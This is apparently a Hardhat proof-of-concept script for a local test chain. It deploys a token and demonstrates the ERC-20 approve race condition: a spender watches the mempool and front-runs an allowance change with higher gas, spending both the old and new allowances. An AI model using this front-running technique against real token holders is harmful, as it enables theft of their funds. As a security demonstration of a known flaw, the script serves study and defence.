const { ethers } = require("hardhat");

// Main configuration for the simulation
const CONFIG = {
  TOKEN_DECIMALS: 18,
  INITIAL_TRANSFER: ethers.parseUnits("300", 18),
  INITIAL_APPROVAL: ethers.parseUnits("100", 18),
  INCREASED_APPROVAL: ethers.parseUnits("200", 18),
  FRONTRUN_GAS_BOOST: ethers.parseUnits("10", "gwei"),
};

// Simulation class to encapsulate the attack simulation
class ApprovalAttackSimulation {
  constructor() {
    this.actors = {}; // Will hold owner, alice, bob
    this.ctuToken = null;
    this.expectedResults = {
      aliceBalance: ethers.parseUnits("0", 18), // 300 - 100 - 200 = 0
      bobBalance: ethers.parseUnits("300", 18), // 0 + 100 + 200 = 300
      finalAllowance: 0,
    };
  }

  async initialize() {
    console.log("===== Initializing Attack Simulation =====\n");

    // Get signers: owner, alice, bob
    const [owner, alice, bob] = await ethers.getSigners();
    this.actors = { owner, alice, bob };

    console.log(`Owner Address:    ${owner.address}`);
    console.log(`Alice Address:    ${alice.address}`);
    console.log(`Bob Address:      ${bob.address}\n`);

    // Deploy the CTUToken contract
    const CTUToken = await ethers.getContractFactory("CTUToken");
    this.ctuToken = await CTUToken.deploy();
    await this.ctuToken.waitForDeployment();
    console.log(`CTUToken deployed at: ${this.ctuToken.target}\n`);
  }

  async setupInitialState() {
    const { owner, alice } = this.actors;

    // Owner transfers tokens to Alice
    const transferTx = await this.ctuToken.transfer(
      alice.address,
      CONFIG.INITIAL_TRANSFER
    );
    await transferTx.wait();

    // Alice approves Bob to spend initial amount
    const approveTx = await this.ctuToken
      .connect(alice)
      .approve(this.actors.bob.address, CONFIG.INITIAL_APPROVAL);
    await approveTx.wait();

    // Display Initial State
    console.log("===== Initial State =====");
    await this.displayState();
    console.log("========================\n");
  }

  async executeAttack() {
    const { alice, bob } = this.actors;

    // Step 1: Alice initiates approval to increase amount
    console.log("=== Step 1: Alice Initiates Approval to Increase Allowance");
    console.log(
      "=== Alice is sending a transaction to the mempool to approve more CTU for Bob.\n"
    );

    const approveTxIncreased = await this.ctuToken
      .connect(alice)
      .approve(bob.address, CONFIG.INCREASED_APPROVAL);

    // Print the state of the mempool
    await this.printMempool();

    // Step 2: Bob frontrunning - uses existing allowance before it's changed
    console.log(
      "=== Step 2: Bob detects the pending approval and uses the existing allowance to transfer tokens."
    );
    console.log(
      "=== Bob is frontrunning the transaction by setting higher fees."
    );

    // Calculate increased gas fees for frontrunning
    const gasEstimate = await ethers.provider.getFeeData();
    const increasedMaxFeePerGas =
      gasEstimate.maxFeePerGas + CONFIG.FRONTRUN_GAS_BOOST;
    const increasedMaxPriorityFeePerGas =
      gasEstimate.maxPriorityFeePerGas + CONFIG.FRONTRUN_GAS_BOOST;

    // Bob sends transferFrom with higher gas to frontrun
    const txBob1 = await this.ctuToken
      .connect(bob)
      .transferFrom(alice.address, bob.address, CONFIG.INITIAL_APPROVAL, {
        maxFeePerGas: increasedMaxFeePerGas,
        maxPriorityFeePerGas: increasedMaxPriorityFeePerGas,
      });

    await this.printMempool();

    // Wait until both transactions are mined
    await approveTxIncreased.wait();
    await txBob1.wait();

    console.log("Bob transferred tokens using the initial allowance.\n");
    console.log(
      "Alice's transaction is mined after being frontrunned by Bob's transferFrom transaction.\n"
    );

    // Display intermediate state
    console.log("===== State After Alice's Approval =====");
    await this.displayState();
    console.log("==========================================\n");

    // Step 3: Bob uses the increased allowance
    console.log("=== Step 3: Bob Utilizes Increased Approval");
    console.log(
      "=== Bob transfers an additional amount using the increased allowance."
    );

    const txBob2 = await this.ctuToken
      .connect(bob)
      .transferFrom(alice.address, bob.address, CONFIG.INCREASED_APPROVAL);
    await txBob2.wait();

    // Display Final State
    console.log("===== Final State =====");
    await this.displayState();
    console.log("=======================\n");
  }

  async verifyAttackResults() {
    const { alice, bob } = this.actors;

    // Fetch actual final values
    const finalAliceBalance = await this.ctuToken.balanceOf(alice.address);
    const finalBobBalance = await this.ctuToken.balanceOf(bob.address);
    const finalAllowance = await this.ctuToken.allowance(
      alice.address,
      bob.address
    );

    // Check if the attack was successful
    const isAttackSuccessful =
      finalAliceBalance.toString() ===
        this.expectedResults.aliceBalance.toString() &&
      finalBobBalance.toString() ===
        this.expectedResults.bobBalance.toString() &&
      finalAllowance.toString() ===
        this.expectedResults.finalAllowance.toString();

    if (isAttackSuccessful) {
      console.log("===== Attack Successful =====");
      console.log(
        "The attack has successfully exploited the approval race condition."
      );
      console.log(
        `Final Alice Balance: ${ethers.formatUnits(
          finalAliceBalance,
          CONFIG.TOKEN_DECIMALS
        )} CTU`
      );
      console.log(
        `Final Bob Balance:   ${ethers.formatUnits(
          finalBobBalance,
          CONFIG.TOKEN_DECIMALS
        )} CTU`
      );
      console.log(
        `Final Allowance:     ${ethers.formatUnits(
          finalAllowance,
          CONFIG.TOKEN_DECIMALS
        )} CTU\n`
      );
    } else {
      console.log("===== Attack Failed =====");
      console.log("The attack did not execute as expected. Details below:");

      // Detailed failure reasons
      if (
        finalAliceBalance.toString() !==
        this.expectedResults.aliceBalance.toString()
      ) {
        console.log(
          `- Alice's balance is ${ethers.formatUnits(
            finalAliceBalance,
            CONFIG.TOKEN_DECIMALS
          )} CTU, expected ${ethers.formatUnits(
            this.expectedResults.aliceBalance,
            CONFIG.TOKEN_DECIMALS
          )} CTU.`
        );
      }
      if (
        finalBobBalance.toString() !==
        this.expectedResults.bobBalance.toString()
      ) {
        console.log(
          `- Bob's balance is ${ethers.formatUnits(
            finalBobBalance,
            CONFIG.TOKEN_DECIMALS
          )} CTU, expected ${ethers.formatUnits(
            this.expectedResults.bobBalance,
            CONFIG.TOKEN_DECIMALS
          )} CTU.`
        );
      }
      if (
        finalAllowance.toString() !==
        this.expectedResults.finalAllowance.toString()
      ) {
        console.log(
          `- Allowance is ${ethers.formatUnits(
            finalAllowance,
            CONFIG.TOKEN_DECIMALS
          )} CTU, expected ${ethers.formatUnits(
            this.expectedResults.finalAllowance,
            CONFIG.TOKEN_DECIMALS
          )} CTU.`
        );
      }

      // Additional Logs for Debugging
      console.log("\n===== Detailed Final State =====");
      await this.displayState();
      console.log("================================\n");
    }

    console.log("===== Attack Simulation Completed =====");
  }

  // Helper function to display current state
  async displayState() {
    const { alice, bob } = this.actors;

    const aliceBalance = ethers.formatUnits(
      await this.ctuToken.balanceOf(alice.address),
      CONFIG.TOKEN_DECIMALS
    );

    const bobBalance = ethers.formatUnits(
      await this.ctuToken.balanceOf(bob.address),
      CONFIG.TOKEN_DECIMALS
    );

    const allowance = ethers.formatUnits(
      await this.ctuToken.allowance(alice.address, bob.address),
      CONFIG.TOKEN_DECIMALS
    );

    console.log(`Alice Balance:               ${aliceBalance} CTU`);
    console.log(`Bob Balance:                 ${bobBalance} CTU`);
    console.log(`Allowance (Alice->Bob):      ${allowance} CTU`);
  }

  // Helper function to print pending transactions
  async printMempool() {
    const pendingBlock = await network.provider.send("eth_getBlockByNumber", [
      "pending",
      false,
    ]);

    for (const tx of pendingBlock.transactions) {
      const txData = await network.provider.send("eth_getTransactionByHash", [
        tx,
      ]);
      console.log(`Transaction Hash: ${txData.hash}`);
      console.log(`From:             ${txData.from}`);
      console.log(`To:               ${txData.to}`);
      console.log(
        `Value:            ${ethers.formatUnits(txData.value, "ether")} ETH`
      );
      console.log(
        `Gas Price:        ${ethers.formatUnits(txData.gasPrice, "gwei")} GWEI`
      );
      console.log(`Gas:              ${Number(txData.gas)}`);
      console.log(`Input:            ${txData.input}`);
      console.log(
        `Max Fee Per Gas:  ${ethers.formatUnits(
          txData.maxFeePerGas,
          "gwei"
        )} GWEI`
      );
      console.log(
        `Max Priority Fee: ${ethers.formatUnits(
          txData.maxPriorityFeePerGas,
          "gwei"
        )} GWEI`
      );
      console.log("------------------------------------------\n");
    }
  }

  // Helper function to print the information about the last block
  async printLastBlockInfo() {
    const lastBlock = await ethers.provider.getBlock("latest");
    console.log("===== Block Mined =====");
    console.log(`Block Number:     ${lastBlock.number}`);
    console.log(`Block Hash:       ${lastBlock.hash}`);
    console.log(`Parent Hash:      ${lastBlock.parentHash}`);
    console.log(
      `Timestamp:        ${new Date(
        lastBlock.timestamp * 1000
      ).toLocaleString()}`
    );
    console.log(`Transactions:     ${lastBlock.transactions.length}`);
    console.log(`Validator:        ${lastBlock.miner || lastBlock.validator}`);
    console.log(
      `Gas Limit:        ${ethers.formatUnits(lastBlock.gasLimit, "gwei")} GWEI`
    );
    console.log(
      `Gas Used:         ${ethers.formatUnits(lastBlock.gasUsed, "gwei")} GWEI`
    );
    console.log(
      `Base Fee Per Gas: ${ethers.formatUnits(
        lastBlock.baseFeePerGas || 0,
        "gwei"
      )} GWEI`
    );
    console.log("==================================\n");

    // Print transactions, their hashes, and order
    console.log("===== Transactions in Last Block =====");
    const transactions = await Promise.all(
      lastBlock.transactions.map((txHash) =>
        ethers.provider.getTransaction(txHash)
      )
    );
    transactions.sort((a, b) => a.nonce - b.nonce);

    for (const tx of transactions) {
      console.log(`Nonce: ${tx.nonce}, Transaction Hash: ${tx.hash}`);
    }

    console.log("======================================\n");
  }

  // Helper function to print information about all blocks
  async printAllBlocksInfo() {
    const latestBlockNumber = await ethers.provider.getBlockNumber();
    console.log(`Printing all blocks from 0 to ${latestBlockNumber}...\n`);

    for (let blockNumber = 0; blockNumber <= latestBlockNumber; blockNumber++) {
      const block = await ethers.provider.getBlock(blockNumber);
      console.log("===== Block Information =====");
      console.log(`Block Number:     ${block.number}`);
      console.log(`Block Hash:       ${block.hash}`);
      console.log(`Parent Hash:      ${block.parentHash}`);
      console.log(
        `Timestamp:        ${new Date(block.timestamp * 1000).toLocaleString()}`
      );
      console.log(`Transactions:     ${block.transactions.length}`);
      console.log(`Validator:        ${block.miner || block.validator}`);
      console.log(
        `Gas Limit:        ${ethers.formatUnits(block.gasLimit, "gwei")} GWEI`
      );
      console.log(
        `Gas Used:         ${ethers.formatUnits(block.gasUsed, "gwei")} GWEI`
      );
      console.log(
        `Base Fee Per Gas: ${ethers.formatUnits(
          block.baseFeePerGas || 0,
          "gwei"
        )} GWEI`
      );
      console.log("==============================\n");

      // If the block has transactions, print them
      if (block.transactions.length > 0) {
        console.log("===== Transactions in Block =====");
        const transactions = await Promise.all(
          block.transactions.map((txHash) =>
            ethers.provider.getTransaction(txHash)
          )
        );
        transactions.sort((a, b) => a.nonce - b.nonce);

        for (const tx of transactions) {
          console.log(`Nonce: ${tx.nonce}, Transaction Hash: ${tx.hash}`);
          console.log(`From: ${tx.from}`);
          console.log(`To: ${tx.to}`);
          console.log(`Value: ${ethers.formatUnits(tx.value, "ether")} ETH`);
          console.log(
            `Gas Price: ${ethers.formatUnits(tx.gasPrice || 0, "gwei")} GWEI`
          );
          console.log("-------------------------------");
        }
        console.log("================================\n");
      }
    }
    console.log("===== Block Printing Completed =====");
  }
}

// Main function using the simulation class
async function main() {
  const simulation = new ApprovalAttackSimulation();

  try {
    await simulation.initialize();
    await simulation.setupInitialState();
    await simulation.executeAttack();
    await simulation.verifyAttackResults();

    // Uncomment to print all block info
    // await simulation.printAllBlocksInfo();

    return 0;
  } catch (error) {
    console.error("An error occurred during the attack simulation:");
    console.error(error);
    return 1;
  }
}

// Execute and handle process exit
main()
  .then((exitCode) => process.exit(exitCode))
  .catch((error) => {
    console.error("Fatal error:", error);
    process.exit(1);
  });
